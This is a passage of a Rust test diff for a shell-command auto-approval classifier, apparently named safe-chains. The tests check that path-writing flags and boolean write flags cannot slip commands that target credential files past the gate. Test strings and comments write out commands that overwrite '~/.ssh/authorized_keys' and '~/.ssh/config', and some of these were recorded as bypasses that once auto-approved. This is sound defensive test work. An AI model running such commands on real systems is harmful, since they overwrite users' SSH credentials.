-    /// So every candidate must declare its facet profile, and the vocabulary is validated against
-    /// the engine's own enums — an unfilled or invented term is a build error rather than a vague
-    /// "verified format-only" that nobody can re-check.
-    #[test]
-    fn a_path_named_flag_records_its_facet_profile() {
-        use super::types::TomlFile;
-        const SENSITIVE: &str = "~/.ssh/authorized_keys";
-        // Population selector, NOT a safety judgement: a name saying "this value is a filesystem
-        // location". Under-selecting only leaves a flag unswept (it is never a claim of safety), so
-        // the list is deliberately plain rather than clever.
-        const PATH_NAMED: &[&str] =
-            &["dir", "Dir", "path", "Path", "file", "File", "folder", "Folder"];
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
+    let mut files = Vec::new();
+    toml_files(&root, &mut files);
 
-        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            for e in std::fs::read_dir(dir).expect("read commands dir") {
-                let p = e.expect("dir entry").path();
-                if p.is_dir() {
-                    toml_files(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
+    let mut candidates: Vec<(String, String)> = Vec::new();
+    for file in &files {
+        let src = std::fs::read_to_string(file).expect("read toml");
+        let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
+        for cmd in &parsed.command {
+            // Recurses into NESTED subs. Walking only one level left 32 path-named spellings
+            // (across 2421 nested sub blocks) unswept — a guard that claims coverage has to
+            // cover, or its green is a statement about its own reach rather than the tree's.
+            fn collect<'a>(prefix: &str, subs: &'a [TomlSub], out: &mut Vec<(String, &'a Vec<String>)>) {
+                for sub in subs {
+                    let label = format!("{prefix} {}", sub.name);
+                    out.push((label.clone(), &sub.valued));
+                    collect(&label, &sub.sub, out);
                 }
             }
-        }
-
-        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
-        let mut files = Vec::new();
-        toml_files(&root, &mut files);
-
-        let mut candidates: Vec<(String, String)> = Vec::new();
-        for file in &files {
-            let src = std::fs::read_to_string(file).expect("read toml");
-            let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
-            for cmd in &parsed.command {
-                // Recurses into NESTED subs. Walking only one level left 32 path-named spellings
-                // (across 2421 nested sub blocks) unswept — a guard that claims coverage has to
-                // cover, or its green is a statement about its own reach rather than the tree's.
-                fn collect<'a>(
-                    prefix: &str,
-                    subs: &'a [TomlSub],
-                    out: &mut Vec<(String, &'a Vec<String>)>,
-                ) {
-                    for sub in subs {
-                        let label = format!("{prefix} {}", sub.name);
-                        out.push((label.clone(), &sub.valued));
-                        collect(&label, &sub.sub, out);
+            let mut scopes: Vec<(String, &Vec<String>)> = vec![(cmd.name.clone(), &cmd.valued)];
+            collect(&cmd.name, &cmd.sub, &mut scopes);
+            for (label, valued) in scopes {
+                for flag in valued {
+                    if !PATH_NAMED.iter().any(|s| flag.contains(s)) {
+                        continue;
                     }
-                }
-                let mut scopes: Vec<(String, &Vec<String>)> =
-                    vec![(cmd.name.clone(), &cmd.valued)];
-                collect(&cmd.name, &cmd.sub, &mut scopes);
-                for (label, valued) in scopes {
-                    for flag in valued {
-                        if !PATH_NAMED.iter().any(|s| flag.contains(s)) {
-                            continue;
-                        }
-                        if crate::is_safe_command(&format!("{label} {flag} {SENSITIVE}")) {
-                            candidates.push((label.clone(), flag.clone()));
-                        }
+                    if crate::is_safe_command(&format!("{label} {flag} {SENSITIVE}")) {
+                        candidates.push((label.clone(), flag.clone()));
                     }
                 }
             }
         }
-        candidates.sort();
-        candidates.dedup();
+    }
+    candidates.sort();
+    candidates.dedup();
 
-        let (listed, mut malformed) = parse_facet_fixture();
-        malformed.sort();
-        assert!(
-            malformed.is_empty(),
-            "malformed rows in tests/fixtures/path_named_flag_facets.tsv ({}):\n{}",
-            malformed.len(),
-            malformed.join("\n"),
-        );
+    let (listed, mut malformed) = parse_facet_fixture();
+    malformed.sort();
+    assert!(
+        malformed.is_empty(),
+        "malformed rows in tests/fixtures/path_named_flag_facets.tsv ({}):\n{}",
+        malformed.len(),
+        malformed.join("\n"),
+    );
 
-        let found: std::collections::HashSet<(String, String)> =
-            candidates.iter().cloned().collect();
-        let mut unlisted: Vec<_> = found.difference(&listed).collect();
-        unlisted.sort();
-        assert!(
-            unlisted.is_empty(),
-            "path-named flags that auto-approve a sensitive path and are NOT recorded ({}) — add \
+    let found: std::collections::HashSet<(String, String)> = candidates.iter().cloned().collect();
+    let mut unlisted: Vec<_> = found.difference(&listed).collect();
+    unlisted.sort();
+    assert!(
+        unlisted.is_empty(),
+        "path-named flags that auto-approve a sensitive path and are NOT recorded ({}) — add \
              each to tests/fixtures/path_named_flag_facets.tsv with its facet profile, or gate \
              it:\n{}",
-            unlisted.len(),
-            unlisted.iter().map(|(c, f)| format!("  {c} `{f}`")).collect::<Vec<_>>().join("\n"),
-        );
+        unlisted.len(),
+        unlisted.iter().map(|(c, f)| format!("  {c} `{f}`")).collect::<Vec<_>>().join("\n"),
+    );
 
-        let mut stale: Vec<_> = listed.difference(&found).collect();
-        stale.sort();
-        assert!(
-            stale.is_empty(),
-            "recorded rows that no longer auto-approve ({}) — they were gated, so delete them from \
+    let mut stale: Vec<_> = listed.difference(&found).collect();
+    stale.sort();
+    assert!(
+        stale.is_empty(),
+        "recorded rows that no longer auto-approve ({}) — they were gated, so delete them from \
              tests/fixtures/path_named_flag_facets.tsv:\n{}",
-            stale.len(),
-            stale.iter().map(|(c, f)| format!("  {c} `{f}`")).collect::<Vec<_>>().join("\n"),
-        );
+        stale.len(),
+        stale.iter().map(|(c, f)| format!("  {c} `{f}`")).collect::<Vec<_>>().join("\n"),
+    );
+}
+
+/// A BOOLEAN write-mode flag makes the command rewrite its OPERANDS, so the operands are the
+/// write targets and must be gated as such.
+///
+/// This exists because the sweep that was supposed to find these could not see them. Every
+/// output-flag probe has the shape `<cmd> <flag> <sensitive>` — ONE operand — which cannot
+/// distinguish a working gate from a mis-typed one that ate the path as the flag's value.
+/// `shfmt -w` was gated as if it took a path; the one-operand probe therefore DENIED and the
+/// gate looked correct, while `shfmt -w ./a.sh ~/.ssh/config` auto-approved and overwrote a
+/// credential file with formatted shell.
+///
+/// So the probe here puts a plausible first operand ahead of the sensitive one. The population
+/// is derived, not guessed: a flag the entry ITSELF declares in `write_flags` (the author's
+/// claim that this flag makes the run write) that is also declared `standalone` and NOT
+/// `valued` (so it takes no value, and the operands are what gets written).
+#[test]
+fn a_boolean_write_flag_gates_its_operands() {
+    use super::types::TomlFile;
+    const SENSITIVE: &str = "~/.ssh/authorized_keys";
+
+    fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        for e in std::fs::read_dir(dir).expect("read commands dir") {
+            let p = e.expect("dir entry").path();
+            if p.is_dir() {
+                toml_files(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
+            }
+        }
     }
 
-    /// A BOOLEAN write-mode flag makes the command rewrite its OPERANDS, so the operands are the
-    /// write targets and must be gated as such.
-    ///
-    /// This exists because the sweep that was supposed to find these could not see them. Every
-    /// output-flag probe has the shape `<cmd> <flag> <sensitive>` — ONE operand — which cannot
-    /// distinguish a working gate from a mis-typed one that ate the path as the flag's value.
-    /// `shfmt -w` was gated as if it took a path; the one-operand probe therefore DENIED and the
-    /// gate looked correct, while `shfmt -w ./a.sh ~/.ssh/config` auto-approved and overwrote a
-    /// credential file with formatted shell.
-    ///
-    /// So the probe here puts a plausible first operand ahead of the sensitive one. The population
-    /// is derived, not guessed: a flag the entry ITSELF declares in `write_flags` (the author's
-    /// claim that this flag makes the run write) that is also declared `standalone` and NOT
-    /// `valued` (so it takes no value, and the operands are what gets written).
-    #[test]
-    fn a_boolean_write_flag_gates_its_operands() {
-        use super::types::TomlFile;
-        const SENSITIVE: &str = "~/.ssh/authorized_keys";
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
+    let mut files = Vec::new();
+    toml_files(&root, &mut files);
 
-        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            for e in std::fs::read_dir(dir).expect("read commands dir") {
-                let p = e.expect("dir entry").path();
-                if p.is_dir() {
-                    toml_files(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
+    // VERIFIED artifacts: the probe's operands are not file targets for these, so there is
+    // nothing to gate. Fails in both directions, so the list cannot rot.
+    let artifacts: std::collections::HashSet<(String, String)> = include_str!("../../tests/fixtures/operand_write_probe_artifacts.tsv")
+        .lines()
+        .filter(|l| !l.trim().is_empty() && !l.starts_with('#'))
+        .filter_map(|l| l.split_once('\t').map(|(c, f)| (c.to_string(), f.to_string())))
+        .collect();
+
+    let mut holes: Vec<String> = Vec::new();
+    let mut seen: std::collections::HashSet<(String, String)> = Default::default();
+    for file in &files {
+        let src = std::fs::read_to_string(file).expect("read toml");
+        let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
+        for cmd in &parsed.command {
+            struct Scope<'a> {
+                label: String,
+                write_flags: &'a [String],
+                standalone: &'a [String],
+                valued: &'a [String],
+            }
+            fn collect<'a>(prefix: &str, subs: &'a [TomlSub], out: &mut Vec<Scope<'a>>) {
+                for sub in subs {
+                    let label = format!("{prefix} {}", sub.name);
+                    out.push(Scope {
+                        label: label.clone(),
+                        write_flags: &sub.write_flags,
+                        standalone: &sub.standalone,
+                        valued: &sub.valued,
+                    });
+                    collect(&label, &sub.sub, out);
                 }
             }
-        }
-
-        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
-        let mut files = Vec::new();
-        toml_files(&root, &mut files);
-
-        // VERIFIED artifacts: the probe's operands are not file targets for these, so there is
-        // nothing to gate. Fails in both directions, so the list cannot rot.
-        let artifacts: std::collections::HashSet<(String, String)> =
-            include_str!("../../tests/fixtures/operand_write_probe_artifacts.tsv")
-                .lines()
-                .filter(|l| !l.trim().is_empty() && !l.starts_with('#'))
-                .filter_map(|l| l.split_once('\t').map(|(c, f)| (c.to_string(), f.to_string())))
-                .collect();
-
-        let mut holes: Vec<String> = Vec::new();
-        let mut seen: std::collections::HashSet<(String, String)> = Default::default();
-        for file in &files {
-            let src = std::fs::read_to_string(file).expect("read toml");
-            let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
-            for cmd in &parsed.command {
-                struct Scope<'a> {
-                    label: String,
-                    write_flags: &'a [String],
-                    standalone: &'a [String],
-                    valued: &'a [String],
-                }
-                fn collect<'a>(prefix: &str, subs: &'a [TomlSub], out: &mut Vec<Scope<'a>>) {
-                    for sub in subs {
-                        let label = format!("{prefix} {}", sub.name);
-                        out.push(Scope {
-                            label: label.clone(),
-                            write_flags: &sub.write_flags,
-                            standalone: &sub.standalone,
-                            valued: &sub.valued,
-                        });
-                        collect(&label, &sub.sub, out);
+            let mut scopes =
+                vec![Scope { label: cmd.name.clone(), write_flags: &cmd.write_flags, standalone: &cmd.standalone, valued: &cmd.valued }];
+            collect(&cmd.name, &cmd.sub, &mut scopes);
+            for Scope { label, write_flags, standalone, valued } in scopes {
+                for flag in write_flags {
+                    let boolean = standalone.contains(flag) && !valued.contains(flag);
+                    if !boolean {
+                        continue;
                     }
-                }
-                let mut scopes = vec![Scope {
-                    label: cmd.name.clone(),
-                    write_flags: &cmd.write_flags,
-                    standalone: &cmd.standalone,
-                    valued: &cmd.valued,
-                }];
-                collect(&cmd.name, &cmd.sub, &mut scopes);
-                for Scope { label, write_flags, standalone, valued } in scopes {
-                    for flag in write_flags {
-                        let boolean = standalone.contains(flag) && !valued.contains(flag);
-                        if !boolean {
-                            continue;
-                        }
-                        let probe = format!("{label} {flag} ./probe.txt {SENSITIVE}");
-                        if crate::is_safe_command(&probe) {
-                            let key = (label.clone(), flag.clone());
-                            seen.insert(key.clone());
-                            if !artifacts.contains(&key) {
-                                holes.push(format!("  {probe}"));
-                            }
+                    let probe = format!("{label} {flag} ./probe.txt {SENSITIVE}");
+                    if crate::is_safe_command(&probe) {
+                        let key = (label.clone(), flag.clone());
+                        seen.insert(key.clone());
+                        if !artifacts.contains(&key) {
+                            holes.push(format!("  {probe}"));
                         }
                     }
                 }
             }
         }
+    }
 
-        holes.sort();
-        holes.dedup();
-        assert!(
-            holes.is_empty(),
-            "boolean write-mode flags whose OPERANDS are ungated ({}) — the command rewrites each \
+    holes.sort();
+    holes.dedup();
+    assert!(
+        holes.is_empty(),
+        "boolean write-mode flags whose OPERANDS are ungated ({}) — the command rewrites each \
              operand in place, so gate the positionals (`write_when` on the flag, or \
              `positional = \"write\"` if it always writes). If the operands are NOT file targets \
              for this command, add it to tests/fixtures/operand_write_probe_artifacts.tsv with the \
              verified reason:\n{}",
-            holes.len(),
-            holes.join("\n"),
-        );
+        holes.len(),
+        holes.join("\n"),
+    );
 
-        let mut stale: Vec<_> = artifacts.difference(&seen).collect();
-        stale.sort();
-        assert!(
-            stale.is_empty(),
-            "artifact rows that no longer auto-approve ({}) — they were gated or the entry changed, \
+    let mut stale: Vec<_> = artifacts.difference(&seen).collect();
+    stale.sort();
+    assert!(
+        stale.is_empty(),
+        "artifact rows that no longer auto-approve ({}) — they were gated or the entry changed, \
              so remove them from tests/fixtures/operand_write_probe_artifacts.tsv:\n{}",
-            stale.len(),
-            stale.iter().map(|(c, f)| format!("  {c} `{f}`")).collect::<Vec<_>>().join("\n"),
-        );
+        stale.len(),
+        stale.iter().map(|(c, f)| format!("  {c} `{f}`")).collect::<Vec<_>>().join("\n"),
+    );
+}
+
+/// A gated flag CONSUMES a value, so declaring it `standalone`-only is a contradiction — and a
+/// silent one. The gate reads as protection; the flag grammar says the flag takes nothing, so
+/// the walker never consumes the following token and the path lands where no role applies.
+///
+/// `safety --save-html ~/.ssh/authorized_keys` auto-approved for exactly this reason: upstream
+/// the flag takes a path, our entry declared it boolean, and the probe fell through to a
+/// positional. That was found by hand, one command at a time. It is checkable for the whole
+/// registry with no research at all, because both halves are already written down.
+///
+/// A flag in BOTH lists is fine and deliberate — that is how this schema spells an OPTIONAL
+/// value (`vegeta report --output` defaults to stdout). The contradiction is `standalone`
+/// WITHOUT `valued`.
+///
+/// Covers both declaration sites (co-located `[command.path_gate]` and the central
+/// `pathgates.toml` map) and recurses into nested subs, since a flag's arity is declared per
+/// scope while a command-level gate applies across all of them.
+///
+/// A flag the command declares `valued` in ANY scope is EXEMPT, even where another scope
+/// declares it standalone-only. That is a real defect too, but a DIFFERENT one: the gate has a
+/// legitimate customer and the mismatch is that path gates are not sub-scoped (`smbutil -f` is
+/// a mounted-share path on `statshares` and a boolean on `view`; `bundle --path` is valued on
+/// `install` and boolean on `info`). Folding the two together would make this guard un-fixable
+/// without the schema change, so it targets only the contradiction with no such excuse: a gate
+/// for a flag the command treats as value-less EVERYWHERE. See TODO.md for the sub-scoping gap.
+#[test]
+fn a_gated_flag_is_never_declared_value_less() {
+    use super::types::{TomlCommand, TomlFile, TomlSub};
+
+    fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        for e in std::fs::read_dir(dir).expect("read commands dir") {
+            let p = e.expect("dir entry").path();
+            if p.is_dir() {
+                toml_files(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
+            }
+        }
     }
 
-    /// A gated flag CONSUMES a value, so declaring it `standalone`-only is a contradiction — and a
-    /// silent one. The gate reads as protection; the flag grammar says the flag takes nothing, so
-    /// the walker never consumes the following token and the path lands where no role applies.
-    ///
-    /// `safety --save-html ~/.ssh/authorized_keys` auto-approved for exactly this reason: upstream
-    /// the flag takes a path, our entry declared it boolean, and the probe fell through to a
-    /// positional. That was found by hand, one command at a time. It is checkable for the whole
-    /// registry with no research at all, because both halves are already written down.
-    ///
-    /// A flag in BOTH lists is fine and deliberate — that is how this schema spells an OPTIONAL
-    /// value (`vegeta report --output` defaults to stdout). The contradiction is `standalone`
-    /// WITHOUT `valued`.
-    ///
-    /// Covers both declaration sites (co-located `[command.path_gate]` and the central
-    /// `pathgates.toml` map) and recurses into nested subs, since a flag's arity is declared per
-    /// scope while a command-level gate applies across all of them.
-    ///
-    /// A flag the command declares `valued` in ANY scope is EXEMPT, even where another scope
-    /// declares it standalone-only. That is a real defect too, but a DIFFERENT one: the gate has a
-    /// legitimate customer and the mismatch is that path gates are not sub-scoped (`smbutil -f` is
-    /// a mounted-share path on `statshares` and a boolean on `view`; `bundle --path` is valued on
-    /// `install` and boolean on `info`). Folding the two together would make this guard un-fixable
-    /// without the schema change, so it targets only the contradiction with no such excuse: a gate
-    /// for a flag the command treats as value-less EVERYWHERE. See TODO.md for the sub-scoping gap.
-    #[test]
-    fn a_gated_flag_is_never_declared_value_less() {
-        use super::types::{TomlCommand, TomlFile, TomlSub};
-
-        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            for e in std::fs::read_dir(dir).expect("read commands dir") {
-                let p = e.expect("dir entry").path();
-                if p.is_dir() {
-                    toml_files(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
-                }
+    fn check(label: &str, standalone: &[String], valued: &[String], gated: &std::collections::BTreeSet<String>, bad: &mut Vec<String>) {
+        for flag in gated {
+            if standalone.iter().any(|s| s == flag) && !valued.iter().any(|v| v == flag) {
+                bad.push(format!("  {label} `{flag}` — gated as path-valued but declared standalone-only"));
             }
         }
+    }
 
-        fn check(
-            label: &str,
-            standalone: &[String],
-            valued: &[String],
-            gated: &std::collections::BTreeSet<String>,
-            bad: &mut Vec<String>,
-        ) {
-            for flag in gated {
-                if standalone.iter().any(|s| s == flag) && !valued.iter().any(|v| v == flag) {
-                    bad.push(format!(
-                        "  {label} `{flag}` — gated as path-valued but declared standalone-only"
-                    ));
+    fn walk_sub(prefix: &str, sub: &TomlSub, gated: &std::collections::BTreeSet<String>, bad: &mut Vec<String>) {
+        let label = format!("{prefix} {}", sub.name);
+        check(&label, &sub.standalone, &sub.valued, gated, bad);
+        for nested in &sub.sub {
+            walk_sub(&label, nested, gated, bad);
+        }
+    }
+
+    let mut central: std::collections::HashMap<String, Vec<String>> = std::collections::HashMap::new();
+    for (cmd, flag, _role) in crate::pathgate::central_flag_gates() {
+        central.entry(cmd).or_default().push(flag);
+    }
+
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
+    let mut files = Vec::new();
+    toml_files(&root, &mut files);
+
+    let mut bad: Vec<String> = Vec::new();
+    for file in &files {
+        let src = std::fs::read_to_string(file).expect("read toml");
+        let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
+        for cmd in &parsed.command {
+            let cmd: &TomlCommand = cmd;
+            let mut gated: std::collections::BTreeSet<String> = Default::default();
+            if let Some(gate) = &cmd.path_gate {
+                gated.extend(gate.flag_roles().map(|(f, _)| f.to_string()));
+            }
+            if let Some(flags) = central.get(&cmd.name) {
+                gated.extend(flags.iter().cloned());
+            }
+            if gated.is_empty() {
+                continue;
+            }
+            let mut valued_anywhere: std::collections::BTreeSet<&str> = Default::default();
+            fn collect_valued<'a>(subs: &'a [TomlSub], out: &mut std::collections::BTreeSet<&'a str>) {
+                for sub in subs {
+                    out.extend(sub.valued.iter().map(String::as_str));
+                    collect_valued(&sub.sub, out);
                 }
             }
-        }
+            valued_anywhere.extend(cmd.valued.iter().map(String::as_str));
+            collect_valued(&cmd.sub, &mut valued_anywhere);
+            gated.retain(|f| !valued_anywhere.contains(f.as_str()));
 
-        fn walk_sub(
-            prefix: &str,
-            sub: &TomlSub,
-            gated: &std::collections::BTreeSet<String>,
-            bad: &mut Vec<String>,
-        ) {
-            let label = format!("{prefix} {}", sub.name);
-            check(&label, &sub.standalone, &sub.valued, gated, bad);
-            for nested in &sub.sub {
-                walk_sub(&label, nested, gated, bad);
+            check(&cmd.name, &cmd.standalone, &cmd.valued, &gated, &mut bad);
+            for sub in &cmd.sub {
+                walk_sub(&cmd.name, sub, &gated, &mut bad);
             }
         }
+    }
 
-        let mut central: std::collections::HashMap<String, Vec<String>> =
-            std::collections::HashMap::new();
-        for (cmd, flag, _role) in crate::pathgate::central_flag_gates() {
-            central.entry(cmd).or_default().push(flag);
-        }
-
-        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
-        let mut files = Vec::new();
-        toml_files(&root, &mut files);
-
-        let mut bad: Vec<String> = Vec::new();
-        for file in &files {
-            let src = std::fs::read_to_string(file).expect("read toml");
-            let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
-            for cmd in &parsed.command {
-                let cmd: &TomlCommand = cmd;
-                let mut gated: std::collections::BTreeSet<String> = Default::default();
-                if let Some(gate) = &cmd.path_gate {
-                    gated.extend(gate.flag_roles().map(|(f, _)| f.to_string()));
-                }
-                if let Some(flags) = central.get(&cmd.name) {
-                    gated.extend(flags.iter().cloned());
-                }
-                if gated.is_empty() {
-                    continue;
-                }
-                let mut valued_anywhere: std::collections::BTreeSet<&str> = Default::default();
-                fn collect_valued<'a>(
-                    subs: &'a [TomlSub],
-                    out: &mut std::collections::BTreeSet<&'a str>,
-                ) {
-                    for sub in subs {
-                        out.extend(sub.valued.iter().map(String::as_str));
-                        collect_valued(&sub.sub, out);
-                    }
-                }
-                valued_anywhere.extend(cmd.valued.iter().map(String::as_str));
-                collect_valued(&cmd.sub, &mut valued_anywhere);
-                gated.retain(|f| !valued_anywhere.contains(f.as_str()));
-
-                check(&cmd.name, &cmd.standalone, &cmd.valued, &gated, &mut bad);
-                for sub in &cmd.sub {
-                    walk_sub(&cmd.name, sub, &gated, &mut bad);
-                }
-            }
-        }
-
-        bad.sort();
-        assert!(
-            bad.is_empty(),
-            "gated flags declared value-less ({}) — the gate cannot apply, so the path is \
+    bad.sort();
+    assert!(
+        bad.is_empty(),
+        "gated flags declared value-less ({}) — the gate cannot apply, so the path is \
              UNGATED. Move the flag into `valued` (keep it in `standalone` too if its value is \
              genuinely optional):\n{}",
-            bad.len(),
-            bad.join("\n"),
-        );
-    }
+        bad.len(),
+        bad.join("\n"),
+    );
+}
 
-    /// Seeded with the 313 gated commands that predate the rule, so it ratchets: a newly gated
-    /// command must bring its example. Both directions fail, so the list cannot rot.
-    #[test]
-    fn a_gated_command_proves_its_safe_form_still_works() {
-        let seeded: std::collections::HashSet<&str> =
-            include_str!("../../tests/fixtures/gated_without_examples.tsv")
-                .lines()
-                .map(str::trim)
-                .filter(|l| !l.is_empty() && !l.starts_with('#'))
-                .collect();
+/// Seeded with the 313 gated commands that predate the rule, so it ratchets: a newly gated
+/// command must bring its example. Both directions fail, so the list cannot rot.
+#[test]
+fn a_gated_command_proves_its_safe_form_still_works() {
+    let seeded: std::collections::HashSet<&str> = include_str!("../../tests/fixtures/gated_without_examples.tsv")
+        .lines()
+        .map(str::trim)
+        .filter(|l| !l.is_empty() && !l.starts_with('#'))
+        .collect();
 
-        let mut gated_missing: Vec<&str> = Vec::new();
-        let mut now_has: Vec<&str> = Vec::new();
-        for (name, spec) in TOML_REGISTRY.iter() {
-            if name != &spec.name {
-                continue; // aliases carry no examples of their own
-            }
-            // Either declaration site counts: a central `[roles."x"]` (or the flat read/write
-            // lists) in pathgates.toml, or a co-located `[command.path_gate]` on the command.
-            let gated = crate::pathgate::central_role_exists(name) || spec.path_gate.is_some();
-            if !gated {
-                continue;
-            }
-            let has_example = !spec.examples_safe.is_empty();
-            match (has_example, seeded.contains(name.as_str())) {
-                (false, false) => gated_missing.push(name),
-                (true, true) => now_has.push(name),
-                _ => {}
-            }
+    let mut gated_missing: Vec<&str> = Vec::new();
+    let mut now_has: Vec<&str> = Vec::new();
+    for (name, spec) in TOML_REGISTRY.iter() {
+        if name != &spec.name {
+            continue; // aliases carry no examples of their own
         }
-        gated_missing.sort();
-        now_has.sort();
+        // Either declaration site counts: a central `[roles."x"]` (or the flat read/write
+        // lists) in pathgates.toml, or a co-located `[command.path_gate]` on the command.
+        let gated = crate::pathgate::central_role_exists(name) || spec.path_gate.is_some();
+        if !gated {
+            continue;
+        }
+        let has_example = !spec.examples_safe.is_empty();
+        match (has_example, seeded.contains(name.as_str())) {
+            (false, false) => gated_missing.push(name),
+            (true, true) => now_has.push(name),
+            _ => {}
+        }
+    }
+    gated_missing.sort();
+    now_has.sort();
 
-        assert!(
-            gated_missing.is_empty(),
-            "these commands declare a path gate but no `examples_safe`, so nothing proves the gate \
+    assert!(
+        gated_missing.is_empty(),
+        "these commands declare a path gate but no `examples_safe`, so nothing proves the gate \
              leaves ordinary usage working ({}). Add an example of the SAFE form — the in-workspace \
              invocation the gate must still allow:\n  {}",
-            gated_missing.len(),
-            gated_missing.join("\n  "),
-        );
-        assert!(
-            now_has.is_empty(),
-            "these are listed in tests/fixtures/gated_without_examples.tsv but now HAVE examples — \
+        gated_missing.len(),
+        gated_missing.join("\n  "),
+    );
+    assert!(
+        now_has.is_empty(),
+        "these are listed in tests/fixtures/gated_without_examples.tsv but now HAVE examples — \
              remove them from the fixture so the backlog keeps shrinking ({}):\n  {}",
-            now_has.len(),
-            now_has.join("\n  "),
-        );
-    }
+        now_has.len(),
+        now_has.join("\n  "),
+    );
+}
 
-    #[test]
-    fn toml_examples_match_dispatch() {
-        let mut failures = Vec::new();
-        for (name, spec) in TOML_REGISTRY.iter() {
-            // Skip alias entries — examples live on the canonical spec only.
-            if name != &spec.name {
-                continue;
-            }
-            for ex in &spec.examples_safe {
-                if !crate::is_safe_command(ex) {
-                    failures.push(format!("{}: examples_safe rejected: {ex:?}", spec.name));
-                }
-            }
-            for ex in &spec.examples_denied {
-                if crate::is_safe_command(ex) {
-                    failures.push(format!("{}: examples_denied accepted: {ex:?}", spec.name));
-                }
+#[test]
+fn toml_examples_match_dispatch() {
+    let mut failures = Vec::new();
+    for (name, spec) in TOML_REGISTRY.iter() {
+        // Skip alias entries — examples live on the canonical spec only.
+        if name != &spec.name {
+            continue;
+        }
+        for ex in &spec.examples_safe {
+            if !crate::is_safe_command(ex) {
+                failures.push(format!("{}: examples_safe rejected: {ex:?}", spec.name));
             }
         }
-        assert!(failures.is_empty(),
-            "TOML examples drift from dispatcher:\n{}", failures.join("\n"));
+        for ex in &spec.examples_denied {
+            if crate::is_safe_command(ex) {
+                failures.push(format!("{}: examples_denied accepted: {ex:?}", spec.name));
+            }
+        }
+    }
+    assert!(failures.is_empty(), "TOML examples drift from dispatcher:\n{}", failures.join("\n"));
+}
+
+/// A flag is researched FOR A COMMAND, never in general. The same spelling means opposite things
+/// on different commands — `--api-key` NAMES the key to read on `aws apigateway get-api-key`,
+/// but SUPPLIES the caller's credential on `neon`. So a flag may only be accepted where it was
+/// declared, and the guard walks the REAL registry so every present and future profiled sub is
+/// covered without anyone remembering to extend a list.
+///
+/// This exists because the opposite practice was shipped and had to be reverted: one generic
+/// "global options" list pasted into every sub of a CLI, which asserted ~200 flags as researched
+/// that nobody had looked at — including endpoint-redirect (`--endpoint-url`) and credential-
+/// substitution (`--profile`) flags on subs that auto-approve. An omitted flag merely denies; a
+/// wrongly-asserted one claims research that never happened.
+#[test]
+fn a_profiled_sub_accepts_only_flags_declared_for_that_sub() {
+    // Spellings that are plausible on SOME command, so a stray acceptance means the sub is not
+    // really consulting its own declaration.
+    const PROBES: &[&str] = &[
+        "--frobnicate", "--endpoint-url", "--profile", "--api-key", "--token", "--host", "--no-verify-ssl", "--force", "--exec",
+        "--output", "--all",
+    ];
+    let mut leaks = Vec::new();
+    for (name, spec) in TOML_REGISTRY.iter() {
+        if name != &spec.name {
+            continue; // alias entries share the canonical spec
+        }
+        walk_profiled(&spec.kind, &mut vec![spec.name.clone()], &mut |path, sub| {
+            // A sub that explicitly declares unbounded tolerance is opting out BY DECLARATION;
+            // that is the (a)-class problem tracked in TODO.md, not this guard's business.
+            if !matches!(sub.allowed_unknown, crate::policy::UnknownTolerance::Strict) {
+                return;
+            }
+            for probe in PROBES {
+                let declared = sub.allowed_standalone.iter().any(|f| f == probe)
+                    || sub.allowed_valued.iter().any(|f| f == probe)
+                    || sub.flags.iter().any(|f| f.name == *probe)
+                    || sub.output_path_flags.iter().any(|f| f == probe)
+                    || sub.destination_flag.as_deref() == Some(*probe);
+                if declared {
+                    continue;
+                }
+                let cmd = format!("{} {probe} x", path.join(" "));
+                if crate::is_safe_command(&cmd) {
+                    leaks.push(format!("{cmd:?} — `{probe}` is not declared for this sub"));
+                }
+            }
+        });
+    }
+    assert!(leaks.is_empty(), "profiled sub accepted a flag it never declared ({} case(s)):\n  {}", leaks.len(), leaks.join("\n  "),);
+}
+
+/// Visit every profiled sub, carrying the token path that reaches it.
+fn walk_profiled(
+    kind: &'static crate::registry::types::DispatchKind,
+    path: &mut Vec<String>,
+    f: &mut impl FnMut(&[String], &'static crate::registry::types::SubSpec),
+) {
+    use crate::registry::types::DispatchKind as D;
+    let subs = match kind {
+        D::Branching { subs, .. } | D::Custom { subs, .. } => subs,
+        _ => return,
+    };
+    for sub in subs {
+        path.push(sub.name.clone());
+        if sub.profile.is_some() {
+            f(path, sub);
+        }
+        walk_profiled(&sub.kind, path, f);
+        path.pop();
+    }
+}
+
+/// safe-chains must know its OWN command-line surface. Every flag clap defines is enumerated
+/// from the parser itself, so a flag added to `cli.rs` and forgotten in
+/// `commands/tools/safe-chains.toml` fails here instead of silently denying the tool's own
+/// invocation (which is exactly what happened when `--session-id` was added).
+///
+/// Fail-closed by construction: a NEW flag must either classify safe or be declared in
+/// `NOT_AUTO_APPROVED` with a reason. Doing nothing is not an option the guard permits.
+#[test]
+fn safe_chains_knows_its_own_cli_flags() {
+    use clap::CommandFactory;
+
+    // Flags whose effect is deliberately NOT auto-approved: they write another tool's config
+    // (`--setup`/`--tool`/`--auto-detect`) or generate files (`--generate-book`). Listing them
+    // here records the intent, so a flag is never merely *forgotten*.
+    //
+    // `--suggest` was here too, for writing "the very file that grants trust". It no longer
